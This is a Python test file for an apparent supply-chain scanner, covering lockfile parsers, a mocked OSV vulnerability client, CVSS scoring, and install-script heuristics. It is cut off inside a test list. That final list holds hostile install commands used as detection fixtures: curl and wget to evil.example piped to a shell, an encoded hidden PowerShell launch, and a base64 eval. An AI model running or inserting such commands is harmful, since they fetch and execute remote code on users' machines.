"""Supply-chain scanner tests: lockfile parsers, OSV client (mocked urllib), heuristics, Shai-Hulud IOCs,
discovery budgets and scanner integration. No real network access; works on Linux and Windows."""

import hashlib
import io
import json
import re
import urllib.error
from pathlib import Path

import pytest

from aegis.core.config import Config
from aegis.core.models import CheckStatus, Finding, Severity
from aegis.core.signatures import SignatureDB
from aegis.scanners import supplychain as sc
from aegis.scanners.base import REGISTRY, ScanContext, load_all
from aegis.tools import lockfiles as lf
from aegis.tools import osv
from aegis.tools.osv import OsvClient, Pkg, parse_vuln


# --------------------------------------------------------------------------- helpers
class Resp(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


class FakeOsv:
    """Stand-in for urllib.request.urlopen speaking just enough of the OSV API."""

    def __init__(self, hits=None, docs=None, fail=None, pages=None):
        self.hits = hits or {}  # "ecosystem/name@version" -> [advisory ids]
        self.docs = docs or {}  # advisory id -> OSV document
        self.fail = fail  # exception to raise on every call
        self.pages = pages or {}  # key -> [ids on page 2]
        self.batches = []  # sizes of querybatch calls
        self.gets = []  # advisory ids fetched
        self.payloads = []

    def __call__(self, req, timeout=None):
        if self.fail is not None:
            raise self.fail
        url = req.full_url
        if url.endswith("/v1/querybatch"):
            payload = json.loads(req.data.decode("utf-8"))
            self.payloads.append(payload)
            queries = payload["queries"]
            self.batches.append(len(queries))
            results = []
            for q in queries:
                key = f'{q["package"]["ecosystem"]}/{q["package"]["name"]}@{q["version"]}'
                if "page_token" in q:
                    results.append({"vulns": [{"id": i, "modified": "2025-01-01T00:00:00Z"} for i in self.pages[key]]})
                    continue
                ids = self.hits.get(key, [])
                res = {"vulns": [{"id": i, "modified": "2025-01-01T00:00:00Z"} for i in ids]} if ids else {}
                if key in self.pages:
                    res["next_page_token"] = "tok-" + key
                results.append(res)
            return Resp(json.dumps({"results": results}).encode())
        if "/v1/vulns/" in url:
            vid = url.rsplit("/", 1)[1]
            self.gets.append(vid)
            doc = self.docs.get(vid)
            if doc is None:
                raise urllib.error.HTTPError(url, 404, "not found", {}, None)
            return Resp(json.dumps(doc).encode())
        raise urllib.error.URLError("unrouted " + url)


def ghsa(vid, severity="HIGH", pkg=("npm", "lodash"), fixed=("4.17.21",), summary="Prototype Pollution in lodash",
         cvss=None, cwe=None):
    doc = {"id": vid, "summary": summary, "aliases": ["CVE-2021-0001"], "modified": "2025-01-01T00:00:00Z",
           "database_specific": {"severity": severity, "cwe_ids": cwe or []},
           "affected": [{"package": {"ecosystem": pkg[0], "name": pkg[1]},
                         "ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}] + [{"fixed": f} for f in fixed]}]}]}
    if cvss:
        doc["severity"] = [{"type": "CVSS_V3", "score": cvss}]
    return doc


MAL_DOC = {"id": "MAL-2025-47141", "summary": "Malicious code in @ctrl/tinycolor (npm)", "aliases": ["GHSA-qjqf-7j6f-82c4"],
           "modified": "2025-09-17T06:23:36Z", "database_specific": {"malicious-packages-origins": []},
           "affected": [{"package": {"ecosystem": "npm", "name": "@ctrl/tinycolor"}, "ranges": []}]}


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    """Any test that wants OSV installs its own fake; everything else must never touch the network."""
    def boom(req, timeout=None):
        raise urllib.error.URLError("network disabled in tests")

    monkeypatch.setattr("urllib.request.urlopen", boom)


def make_ctx(tmp_path, paths=None, **options):
    cfg = Config.load()
    cfg.use_windows_defender_engine = False
    opts = {"supplychain_default_dirs": False}
    opts.update(options)
    return ScanContext(config=cfg, signatures=SignatureDB(cfg), paths=[Path(p) for p in (paths or [tmp_path])], options=opts)


def write(root, rel, content):
    p = Path(root) / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content if isinstance(content, str) else json.dumps(content, indent=1), encoding="utf-8")
    return p


def lock_v3(packages, root_deps=None):
    pk = {"": {"name": "app", "version": "1.0.0", "dependencies": root_deps or {}}}
    for name, extra in packages.items():
        meta = {"version": extra.get("version", "1.0.0"),
                "resolved": f"https://registry.npmjs.org/{name}/-/{name.split('/')[-1]}-{extra.get('version', '1.0.0')}.tgz"}
        meta.update({k: v for k, v in extra.items() if k != "version"})
        pk[f"node_modules/{name}"] = meta
    return {"name": "app", "lockfileVersion": 3, "requires": True, "packages": pk}


def run_scan(ctx, root=None):
    findings, checks = sc.scan_project_results(root or ctx.paths[0], ctx)
    return findings, checks


def by_rule(findings, rule):
    return [f for f in findings if f.rule_id == rule]


# =========================================================================== parsers
LOCK_V3 = json.dumps({"name": "demo", "version": "1.0.0", "lockfileVersion": 3, "requires": True, "packages": {
    "": {"name": "demo", "version": "1.0.0", "dependencies": {"lodash": "^4.17.15", "string-width-cjs": "npm:string-width@^4.2.0"},
         "devDependencies": {"esbuild": "^0.19.0"}},
    "node_modules/lodash": {"version": "4.17.15", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz",
                            "integrity": "sha512-x"},
    "node_modules/esbuild": {"version": "0.19.2", "resolved": "https://registry.npmjs.org/esbuild/-/esbuild-0.19.2.tgz",
                             "dev": True, "hasInstallScript": True},
    "node_modules/string-width-cjs": {"name": "string-width", "version": "4.2.3",
                                      "resolved": "https://registry.npmjs.org/string-width/-/string-width-4.2.3.tgz"},
    "node_modules/a/node_modules/b": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz"},
    "node_modules/gitdep": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/x/y.git#abc"},
    "node_modules/linked": {"resolved": "packages/linked", "link": True},
    "packages/ws": {"name": "ws-local", "version": "0.0.1"}}})


def test_package_lock_v3_and_v2_share_the_packages_table():
    deps = {d.name: d for d in lf.parse_package_lock(LOCK_V3, "package-lock.json")}
    assert set(deps) == {"lodash", "esbuild", "string-width", "b"}  # git/link/workspace entries skipped, alias resolved
    assert deps["esbuild"].dev and deps["esbuild"].install_script and deps["esbuild"].version == "0.19.2"
    assert deps["lodash"].direct and not deps["b"].direct
    assert deps["string-width"].path == "node_modules/string-width-cjs"
    v2 = json.loads(LOCK_V3)
    v2["lockfileVersion"] = 2
    v2["dependencies"] = {"lodash": {"version": "4.17.15"}}  # legacy tree is ignored when "packages" exists
    assert len(lf.parse_package_lock(json.dumps(v2))) == 4


def test_package_lock_v1_nested_tree_and_alias():
    text = json.dumps({"lockfileVersion": 1, "dependencies": {
        "a": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
              "dependencies": {"b": {"version": "2.0.0", "dev": True}}},
        "c": {"version": "github:u/r#sha"}, "al": {"version": "npm:real@3.0.0"}}})
    deps = {d.name: d for d in lf.parse_package_lock(text)}
    assert set(deps) == {"a", "b", "real"}
    assert deps["b"].path == "node_modules/a/node_modules/b" and deps["b"].dev
    assert deps["real"].version == "3.0.0"


def test_shrinkwrap_is_classified_like_package_lock():
    assert lf.classify("npm-shrinkwrap.json") == "package-lock"
    assert lf.classify("package-lock.json") == "package-lock"


YARN1 = '''# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
# yarn lockfile v1


"@babel/code-frame@^7.0.0", "@babel/code-frame@^7.10.4":
  version "7.12.13"
  resolved "https://registry.yarnpkg.com/@babel/code-frame/-/code-frame-7.12.13.tgz#dcfc826b"
  integrity sha512-HV1Cm0Q3ZrpCR93tkWOYiuYIgLxZXZFVG2VgK+MBWjUqZTundupbfx2aXarXuw5Ko5aMcjtJgbSs4vUGBS5v6g==
  dependencies:
    "@babel/highlight" "^7.12.13"

lodash@^4.17.15:
  version "4.17.15"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.15.tgz#b447f667"

mygit@github:foo/bar:
  version "1.0.0"
  resolved "https://codeload.github.com/foo/bar/tar.gz/abc"
'''

YARN_BERRY = '''# This file is generated by running "yarn install" inside your project.
__metadata:
  version: 6
  cacheKey: 8

"lodash@npm:^4.17.21":
  version: 4.17.21
  resolution: "lodash@npm:4.17.21"
  checksum: eb835a2e51d381e561e508ce932ea50a8e5a68f4ebdd771ea240d3048244a8d13658acbd502cd4829768c56f2e16bdd4340b9ea141297d472517b83868e677f7
  languageName: node
  linkType: hard

"string-width-cjs@npm:string-width@^4.2.0":
  version: 4.2.3
  resolution: "string-width@npm:4.2.3"
  languageName: node
  linkType: hard

"demo@workspace:.":
  version: 0.0.0-use.local
  resolution: "demo@workspace:."
  languageName: unknown
  linkType: soft

"@scope/pkg@patch:@scope/pkg@npm%3A1.0.0#./my.patch::version=1.0.0&hash=abc":
  version: 1.0.0
  resolution: "@scope/pkg@patch:@scope/pkg@npm%3A1.0.0#./my.patch::version=1.0.0&hash=abc"
'''


def test_yarn_lock_classic_and_berry():
    classic = [(d.name, d.version) for d in lf.parse_yarn_lock(YARN1)]
    assert classic == [("@babel/code-frame", "7.12.13"), ("lodash", "4.17.15")]  # github dep skipped
    berry = [(d.name, d.version) for d in lf.parse_yarn_lock(YARN_BERRY)]
    assert berry == [("lodash", "4.17.21"), ("string-width", "4.2.3")]  # alias resolved; workspace + patch skipped


PNPM9 = '''lockfileVersion: '9.0'

settings:
  autoInstallPeers: true

importers:

  .:
    dependencies:
      lodash:
        specifier: ^4.17.15
        version: 4.17.15

packages:

  '@babel/core@7.22.0':
    resolution: {integrity: sha512-abc}
    engines: {node: '>=6.9.0'}

  esbuild@0.19.2:
    resolution: {integrity: sha512-def}
    engines: {node: '>=12'}
    hasBin: true
    requiresBuild: true

  lodash@4.17.15:
    resolution: {integrity: sha512-ghi}

  mylocal@file:../mylocal:
    resolution: {directory: ../mylocal, type: directory}

snapshots:

  lodash@4.17.15: {}
'''
PNPM5 = '''lockfileVersion: 5.4

specifiers:
  lodash: ^4.17.15

packages:

  /@babel/core/7.22.0_react@18.0.0:
    resolution: {integrity: sha512-abc}
    dev: true

  /lodash/4.17.15:
    resolution: {integrity: sha512-ghi}
    dev: false
'''
PNPM6 = '''lockfileVersion: '6.0'
packages:

  /@babel/core@7.22.0(react@18.0.0):
    resolution: {integrity: sha512-abc}
    dev: true
  /lodash@4.17.15:
    resolution: {integrity: sha512-ghi}
    requiresBuild: true
'''


def test_pnpm_lock_v5_v6_v9():
    v9 = {d.name: d for d in lf.parse_pnpm_lock(PNPM9)}
    assert {k: v.version for k, v in v9.items()} == {"@babel/core": "7.22.0", "esbuild": "0.19.2", "lodash": "4.17.15"}
    assert v9["esbuild"].install_script and not v9["lodash"].install_script
    v5 = {d.name: d for d in lf.parse_pnpm_lock(PNPM5)}
    assert v5["@babel/core"].version == "7.22.0" and v5["@babel/core"].dev and not v5["lodash"].dev
    v6 = {d.name: d for d in lf.parse_pnpm_lock(PNPM6)}
    assert v6["@babel/core"].version == "7.22.0" and v6["lodash"].install_script


def test_package_json_ranges_pins_and_scripts():
    text = json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"postinstall": "node install.js", "test": "jest"},
                       "dependencies": {"lodash": "4.17.15", "react": "^18.0.0", "gitdep": "github:foo/bar",
                                        "al": "npm:real@^1.0.0"}, "devDependencies": {"jest": "=29.0.0"}})
    deps, meta = lf.parse_package_json(text, "package.json")
    by = {d.name: d for d in deps}
    assert meta["name"] == "demo" and meta["scripts"]["postinstall"] == "node install.js"
    assert by["lodash"].version == "4.17.15" and by["react"].version == "" and by["react"].spec == "^18.0.0"
    assert by["gitdep"].version == "" and "real" in by and by["jest"].version == "29.0.0" and by["jest"].dev
    assert all(d.direct and d.manifest for d in deps)


REQS = '''# base deps
-r common.txt
--index-url https://pypi.org/simple
requests==2.19.0  # old
Django[argon2]==2.2.0 ; python_version >= "3.6"
numpy>=1.20
flask
git+https://github.com/foo/bar.git#egg=bar
pkg @ https://example.com/pkg.whl
./local/path
cryptography==41.0.0 \\
    --hash=sha256:aaa \\
    --hash=sha256:bbb
PyYAML===6.0
wild==1.*
'''


def test_requirements_pins_and_declared_names():
    deps = {d.name: d for d in lf.parse_requirements(REQS, "requirements.txt")}
    assert set(deps) == {"requests", "Django", "numpy", "flask", "cryptography", "PyYAML", "wild"}
    assert deps["requests"].version == "2.19.0" and deps["Django"].version == "2.2.0"
    assert deps["cryptography"].version == "41.0.0" and deps["PyYAML"].version == "6.0"
    assert deps["numpy"].version == "" and deps["flask"].version == "" and deps["wild"].version == ""
    assert lf.classify("requirements-dev.txt") == "requirements" and lf.classify("dev-requirements.txt") == "requirements"
    assert lf.classify("base.txt", "requirements") == "requirements" and lf.classify("notes.txt") is None


POETRY = '''# This file is automatically @generated by Poetry 1.8.2 and should not be changed by hand.

[[package]]
name = "certifi"
version = "2023.7.22"
description = "Python package for providing Mozilla's CA Bundle."
optional = false
python-versions = ">=3.6"
files = [
    {file = "certifi-2023.7.22-py3-none-any.whl", hash = "sha256:92d6037539857d8206b8f6ae472e8b77db8058fec5937a1ef3f54304089edbb9"},
]

[[package]]
name = "mylib"
version = "0.1.0"
files = []
develop = false

[package.source]
type = "git"
url = "https://github.com/x/mylib.git"
reference = "main"

[[package]]
name = "pytest"
version = "7.4.0"
category = "dev"

[package.dependencies]
colorama = {version = "*", markers = "sys_platform == \\"win32\\""}

[metadata]
lock-version = "2.0"
content-hash = "abc"
'''


def test_poetry_lock_skips_git_and_marks_dev():
    deps = {d.name: d for d in lf.parse_poetry_lock(POETRY)}
    assert set(deps) == {"certifi", "pytest"} and deps["pytest"].dev and not deps["certifi"].dev
    new = "[[package]]\nname = \"black\"\nversion = \"23.1.0\"\ngroups = [\"dev\"]\n\n[[package]]\nname = \"rich\"\nversion = \"13.0.0\"\ngroups = [\"main\", \"dev\"]\n"
    d2 = {d.name: d for d in lf.parse_poetry_lock(new)}
    assert d2["black"].dev and not d2["rich"].dev


UV = '''version = 1
requires-python = ">=3.9"

[[package]]
name = "anyio"
version = "4.0.0"
source = { registry = "https://pypi.org/simple" }
dependencies = [
    { name = "idna" },
]
sdist = { url = "https://files.pythonhosted.org/x.tar.gz", hash = "sha256:abc", size = 1 }
wheels = [
    { url = "https://files.pythonhosted.org/x.whl", hash = "sha256:def", size = 2 },
]

[[package]]
name = "myproject"
version = "0.1.0"
source = { editable = "." }

[package.metadata]
requires-dist = [{ name = "anyio", specifier = ">=4" }]

[[package]]
name = "requests"
version = "2.31.0"
source = { registry = "https://pypi.org/simple" }
'''


def test_uv_lock_registry_packages_only():
    assert [(d.name, d.version) for d in lf.parse_uv_lock(UV)] == [("anyio", "4.0.0"), ("requests", "2.31.0")]


CARGO = '''# This file is automatically @generated by Cargo.
version = 3

[[package]]
name = "myapp"
version = "0.1.0"
dependencies = [
 "time",
]

[[package]]
name = "time"
version = "0.1.43"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "ca8a50ef"

[[package]]
name = "gitdep"
version = "0.2.0"
source = "git+https://github.com/foo/gitdep?branch=main#abcdef"

[[package]]
name = "serde"
version = "1.0.190"
source = "sparse+https://index.crates.io/"
'''


def test_cargo_lock_registry_packages_only():
    assert [(d.name, d.version) for d in lf.parse_cargo_lock(CARGO)] == [("time", "0.1.43"), ("serde", "1.0.190")]


def test_go_mod_preferred_over_go_sum():
    gomod = "module example.com/app\n\ngo 1.21\n\nrequire github.com/gin-gonic/gin v1.6.0\nrequire (\n\tgolang.org/x/crypto v0.0.0-20200622213623-75b288015ac9 // indirect\n\tgithub.com/foo/bar v1.2.3\n)\n\nreplace github.com/foo/bar => ../bar\n"
    deps = {d.name: d for d in lf.parse_go_mod(gomod)}
    assert deps["github.com/gin-gonic/gin"].version == "1.6.0" and deps["github.com/gin-gonic/gin"].direct
    assert not deps["golang.org/x/crypto"].direct and deps["github.com/foo/bar"].version == "1.2.3"
    gosum = "github.com/gin-gonic/gin v1.6.0 h1:abc=\ngithub.com/gin-gonic/gin v1.6.0/go.mod h1:def=\ngithub.com/old/dep v0.1.0/go.mod h1:xyz=\n"
    assert [(d.name, d.version) for d in lf.parse_go_sum(gosum)] == [("github.com/gin-gonic/gin", "1.6.0")]


def test_gemfile_lock_strips_platform_and_ignores_git_section():
    gem = '''GIT
  remote: https://github.com/foo/bar.git
  revision: abc
  specs:
    bar (1.0.0)

GEM
  remote: https://rubygems.org/
  specs:
    actionpack (5.2.0)
      rack (~> 2.0)
    nokogiri (1.15.4-x86_64-linux)
      racc (~> 1.4)
    rack (2.0.5)

PLATFORMS
  ruby
'''
    assert [(d.name, d.version) for d in lf.parse_gemfile_lock(gem)] == [("actionpack", "5.2.0"), ("nokogiri", "1.15.4"), ("rack", "2.0.5")]


def test_composer_pipfile_and_nuget_locks():
    comp = json.dumps({"packages": [{"name": "symfony/http-kernel", "version": "v4.4.0"}, {"name": "foo/dev", "version": "dev-main"}],
                       "packages-dev": [{"name": "phpunit/phpunit", "version": "9.5.0"}]})
    deps = {d.name: d for d in lf.parse_composer_lock(comp)}
    assert deps["symfony/http-kernel"].version == "4.4.0" and deps["phpunit/phpunit"].dev and "foo/dev" not in deps
    pipl = json.dumps({"default": {"requests": {"version": "==2.19.0"}, "loc": {"path": "."}, "star": {"version": "*"}},
                       "develop": {"pytest": {"version": "==7.4.0"}}})
    pd = {d.name: d for d in lf.parse_pipfile_lock(pipl)}
    assert set(pd) == {"requests", "pytest"} and pd["pytest"].dev and pd["requests"].version == "2.19.0"
    nug = json.dumps({"version": 1, "dependencies": {
        "net6.0": {"Newtonsoft.Json": {"type": "Direct", "requested": "[12.0.1, )", "resolved": "12.0.1"},
                   "Mylib": {"type": "Project"}, "System.Text.Json": {"type": "Transitive", "resolved": "6.0.0"}},
        "net8.0": {"Newtonsoft.Json": {"type": "Direct", "resolved": "12.0.1"}}}})
    nd = lf.parse_nuget_lock(nug)
    assert [(d.name, d.version) for d in nd] == [("Newtonsoft.Json", "12.0.1"), ("System.Text.Json", "6.0.0")]
    assert nd[0].direct and not nd[1].direct


def test_pyproject_declared_names():
    text = '''[project]
name = "demo"
dependencies = [
  "requests>=2.0",
  "Flask[async]==2.0.0",
  "numpy",
]

[project.optional-dependencies]
dev = ["pytest", "black>=23"]

[tool.poetry.dependencies]
python = "^3.9"
django = "^4.2"
'''
    names = {d.name: d for d in lf.parse_pyproject(text)}
    assert set(names) == {"requests", "Flask", "numpy", "pytest", "black", "django"} and names["Flask"].version == "2.0.0"


@pytest.mark.parametrize("kind", sorted(lf._TEXT_PARSERS) + ["package.json"])
@pytest.mark.parametrize("junk", ["", "{{{", "\x00\x01\x02", "[[package]]\nname=", "[1, 2, 3]", "\ufeff{}", "a" * 5000])
def test_parsers_never_raise_on_malformed_input(kind, junk):
    res = lf.parse_text(kind, junk, "x")
    assert not res.error


def test_parse_file_handles_oversize_and_missing(tmp_path):
    assert lf.parse_file(tmp_path / "nope" / "package-lock.json").error
    p = write(tmp_path, "package.json", '{"dependencies": {"left-pad": "1.3.0"}}')
    res = lf.parse_file(p)
    assert res.kind == "package.json" and res.deps[0].version == "1.3.0"
    assert lf.parse_file(write(tmp_path, "notes.txt", "x")).error == "not a dependency file"


# =========================================================================== OSV client
def test_querybatch_is_split_into_chunks_of_1000(tmp_path, monkeypatch):
    fake = FakeOsv(hits={"npm/pkg7@1.0.0": ["GHSA-aaaa-bbbb-cccc"]})
    monkeypatch.setattr("urllib.request.urlopen", fake)
    pkgs = [Pkg("npm", f"pkg{i}", "1.0.0") for i in range(2500)]
    client = OsvClient(tmp_path / "osv.json")
    res = client.query(pkgs)
    assert fake.batches == [1000, 1000, 500]
    assert len(res) == 2500 and res[Pkg("npm", "pkg7", "1.0.0")] == ["GHSA-aaaa-bbbb-cccc"]
    assert not client.offline and not client.unchecked
    first = fake.payloads[0]["queries"][0]  # only ecosystem, name and version are sent
    assert set(first) == {"package", "version"} and set(first["package"]) == {"name", "ecosystem"}


def test_querybatch_follows_next_page_token(tmp_path, monkeypatch):
    key = "npm/busy@1.0.0"
    fake = FakeOsv(hits={key: ["GHSA-1111-1111-1111"]}, pages={key: ["GHSA-2222-2222-2222"]})
    monkeypatch.setattr("urllib.request.urlopen", fake)
    res = OsvClient(tmp_path / "osv.json").query([Pkg("npm", "busy", "1.0.0")])
    assert res[Pkg("npm", "busy", "1.0.0")] == ["GHSA-1111-1111-1111", "GHSA-2222-2222-2222"]
    assert fake.batches == [1, 1]


def test_cache_ttl_fresh_hit_then_refresh(tmp_path, monkeypatch):
    fake = FakeOsv(hits={"npm/a@1.0.0": ["GHSA-aaaa-aaaa-aaaa"]})
    monkeypatch.setattr("urllib.request.urlopen", fake)
    now = [1_000_000.0]
    cache = tmp_path / "osv.json"
    pkg = Pkg("npm", "a", "1.0.0")
    OsvClient(cache, ttl=86400, clock=lambda: now[0]).query([pkg])
    assert fake.batches == [1]
    now[0] += 3600  # one hour later: served from the cache file, no network
    c2 = OsvClient(cache, ttl=86400, clock=lambda: now[0])
    assert c2.query([pkg]) == {pkg: ["GHSA-aaaa-aaaa-aaaa"]} and fake.batches == [1] and c2.stats["cache_hits"] == 1
    now[0] += 25 * 3600  # expired: asks again
    c3 = OsvClient(cache, ttl=86400, clock=lambda: now[0])
    c3.query([pkg])
    assert fake.batches == [1, 1]


def test_offline_falls_back_to_stale_cache_and_flags_unchecked(tmp_path, monkeypatch):
    now = [1_000_000.0]
    cache = tmp_path / "osv.json"
    ok = FakeOsv(hits={"npm/a@1.0.0": ["GHSA-aaaa-aaaa-aaaa"]})
    monkeypatch.setattr("urllib.request.urlopen", ok)
    OsvClient(cache, ttl=3600, clock=lambda: now[0]).query([Pkg("npm", "a", "1.0.0")])
    now[0] += 10 * 3600  # stale but within the 30-day fallback window
    monkeypatch.setattr("urllib.request.urlopen", FakeOsv(fail=urllib.error.URLError("no route")))
    client = OsvClient(cache, ttl=3600, clock=lambda: now[0])
    res = client.query([Pkg("npm", "a", "1.0.0"), Pkg("npm", "never-seen", "2.0.0")])
    assert res == {Pkg("npm", "a", "1.0.0"): ["GHSA-aaaa-aaaa-aaaa"]}
    assert client.offline and client.used_stale and client.unchecked == {Pkg("npm", "never-seen", "2.0.0")}
    assert "no route" in client.error
    now[0] += 40 * 86400  # beyond the stale limit: dropped
    client2 = OsvClient(cache, ttl=3600, clock=lambda: now[0])
    assert client2.query([Pkg("npm", "a", "1.0.0")]) == {} and client2.offline


def test_online_false_never_touches_the_network(tmp_path, monkeypatch):
    def forbidden(req, timeout=None):  # pragma: no cover - must not be called
        raise AssertionError("network used")

    monkeypatch.setattr("urllib.request.urlopen", forbidden)
    client = OsvClient(tmp_path / "osv.json", online=False)
    assert client.query([Pkg("npm", "a", "1.0.0")]) == {} and client.offline and "disabled" in client.error
    assert client.details(["GHSA-aaaa-aaaa-aaaa"])["GHSA-aaaa-aaaa-aaaa"].complete is False


def test_corrupt_cache_is_ignored_and_bad_response_goes_offline(tmp_path, monkeypatch):
    cache = tmp_path / "osv.json"
    cache.write_text("{not json", encoding="utf-8")

    class Bad:
        def __call__(self, req, timeout=None):
            return Resp(b'{"results": "nope"}')

    monkeypatch.setattr("urllib.request.urlopen", Bad())
    client = OsvClient(cache)
    assert client.query([Pkg("npm", "a", "1.0.0")]) == {} and client.offline


def test_details_malicious_id_is_critical_and_cached(tmp_path, monkeypatch):
    fake = FakeOsv(docs={"MAL-2025-47141": MAL_DOC, "GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", "MODERATE")})
    monkeypatch.setattr("urllib.request.urlopen", fake)
    client = OsvClient(tmp_path / "osv.json")
    d = client.details(["GHSA-aaaa-aaaa-aaaa", "MAL-2025-47141"])
    assert d["MAL-2025-47141"].malicious and d["MAL-2025-47141"].severity == "CRITICAL"
    assert fake.gets[0] == "MAL-2025-47141"  # malicious advisories are fetched first
    assert d["GHSA-aaaa-aaaa-aaaa"].severity == "MEDIUM" and not d["GHSA-aaaa-aaaa-aaaa"].malicious
    again = OsvClient(tmp_path / "osv.json").details(["MAL-2025-47141"])
    assert again["MAL-2025-47141"].malicious and len(fake.gets) == 2  # second client used the cache file


def test_details_offline_placeholder_keeps_mal_severity(tmp_path, monkeypatch):
    monkeypatch.setattr("urllib.request.urlopen", FakeOsv(fail=urllib.error.URLError("down")))
    d = OsvClient(tmp_path / "osv.json").details(["MAL-2025-1", "GHSA-xxxx-xxxx-xxxx"])
    assert d["MAL-2025-1"].malicious and d["MAL-2025-1"].severity == "CRITICAL" and not d["MAL-2025-1"].complete
    assert d["GHSA-xxxx-xxxx-xxxx"].severity == "" and not d["GHSA-xxxx-xxxx-xxxx"].malicious


def test_details_404_is_not_an_outage(tmp_path, monkeypatch):
    fake = FakeOsv(docs={"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa")})
    monkeypatch.setattr("urllib.request.urlopen", fake)
    client = OsvClient(tmp_path / "osv.json")
    d = client.details(["GHSA-gone-gone-gone", "GHSA-aaaa-aaaa-aaaa"])
    assert not client.offline and d["GHSA-aaaa-aaaa-aaaa"].complete and not d["GHSA-gone-gone-gone"].complete


def test_cvss_scores_match_the_specification():
    assert osv.cvss3_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H") == 9.8
    assert osv.cvss3_score("CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H") == 7.2
    assert osv.cvss3_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N") == 6.1
    assert osv.cvss3_score("CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N") == 0.0
    assert osv.cvss3_score("garbage") is None
    assert osv.cvss2_score("AV:N/AC:L/Au:N/C:P/I:P/A:P") == 7.5
    assert osv.severity_from_score(9.0) == "CRITICAL" and osv.severity_from_score(7.0) == "HIGH"
    assert osv.severity_from_score(4.0) == "MEDIUM" and osv.severity_from_score(0.1) == "LOW"


def test_parse_vuln_severity_sources_and_fixed_versions():
    db = parse_vuln(ghsa("GHSA-1", "CRITICAL", pkg=("PyPI", "Requests_Lib"), fixed=("2.0.1", "1.9.9")))
    assert db.severity == "CRITICAL" and db.severity_source == "database"
    assert db.fixed == {"PyPI/requests-lib": ["2.0.1", "1.9.9"]}
    doc = {"id": "PYSEC-1", "summary": "x", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}],
           "affected": []}
    p = parse_vuln(doc)
    assert p.severity == "CRITICAL" and p.score == 9.8 and p.severity_source == "cvss3"
    v2 = parse_vuln({"id": "X-2", "severity": [{"type": "CVSS_V2", "score": "AV:N/AC:L/Au:N/C:P/I:P/A:P"}]})
    assert v2.severity == "HIGH" and v2.score == 7.5
    v4 = parse_vuln({"id": "X-3", "severity": [{"type": "CVSS_V4", "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"}]})
    assert v4.severity == "CRITICAL" and v4.severity_source == "cvss4-estimate"
    per_pkg = parse_vuln({"id": "RUSTSEC-1", "affected": [{"package": {"ecosystem": "crates.io", "name": "x"},
                                                           "ecosystem_specific": {"severity": "low"}}]})
    assert per_pkg.severity == "LOW"
    assert parse_vuln({"id": "X-4"}).severity == ""  # unknown stays unknown
    assert parse_vuln({"id": "X-5", "withdrawn": "2024-01-01T00:00:00Z"}).withdrawn


def test_parse_vuln_recognises_malware_advisories_outside_the_mal_namespace():
    cwe = parse_vuln(ghsa("GHSA-2", "CRITICAL", summary="Critical severity vulnerability that affects event-stream", cwe=["CWE-506"]))
    assert cwe.malicious and cwe.severity == "CRITICAL" and cwe.severity_source == "malware"
    summ = parse_vuln(ghsa("GHSA-3", "HIGH", summary="Embedded Malicious Code in ctx"))
    assert summ.malicious
    plain = parse_vuln(ghsa("GHSA-4", "HIGH", summary="Prototype pollution in lodash"))
    assert not plain.malicious


def test_pick_fixed_chooses_smallest_version_above_installed():
    assert osv.pick_fixed("4.17.15", ["3.10.2", "4.17.12", "4.17.21"]) == "4.17.21"
    assert osv.pick_fixed("4.17.1", ["4.17.12", "4.17.21"]) == "4.17.12"
    assert osv.pick_fixed("1.0.0", []) == ""
    assert osv.pick_fixed("9.0.0", ["1.2.3"]) == "1.2.3"


def test_norm_name_per_ecosystem():
    assert osv.norm_name("PyPI", "Typing_Extensions") == "typing-extensions"
    assert osv.norm_name("npm", "@Scope/Pkg") == "@scope/pkg"
    assert osv.norm_name("Go", "github.com/Azure/azure-sdk-for-go") == "github.com/Azure/azure-sdk-for-go"
    assert osv.norm_name("NuGet", "Newtonsoft.Json") == "Newtonsoft.Json"


# =========================================================================== heuristics
BENIGN_SCRIPTS = [
    "node install.js",  # esbuild, electron, puppeteer ...
    'node -e "try{require(\'./postinstall\')}catch(e){}"',  # core-js, msw
    "node -e \"console.log('Love this project? https://opencollective.com/x/donate')\"",  # nodemon-style banner
    "node -e \"if(process.env.npm_execpath.indexOf('yarn') === -1) throw new Error('Use yarn')\"",
    "husky install", "husky", "node-gyp rebuild", "node-pre-gyp install --fallback-to-build",
    "prebuild-install || node-gyp rebuild --release", "patch-package", "npx only-allow pnpm",
    "node scripts/base64-assets.js", "wait-on http://127.0.0.1:3000 && jest", "tsc -p .", "node ./scripts/postinstall.js",
    "electron-builder install-app-deps", "prisma generate", "node bundle.js || exit 0",
]


@pytest.mark.parametrize("cmd", BENIGN_SCRIPTS)
def test_benign_install_scripts_are_not_flagged(cmd):
    assert sc.analyze_command(cmd) == (None, [])


@pytest.mark.parametrize("cmd,expected", [
    ("curl -s https://evil.example/x.sh | bash", Severity.HIGH),
    ("wget -qO- https://evil.example/x | sh", Severity.HIGH),
    ("curl http://203.0.113.9/p | node", Severity.HIGH),
    ("powershell -nop -w hidden -enc SQBFAFgA", Severity.HIGH),
    ("node -e \"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())\"", Severity.HIGH),
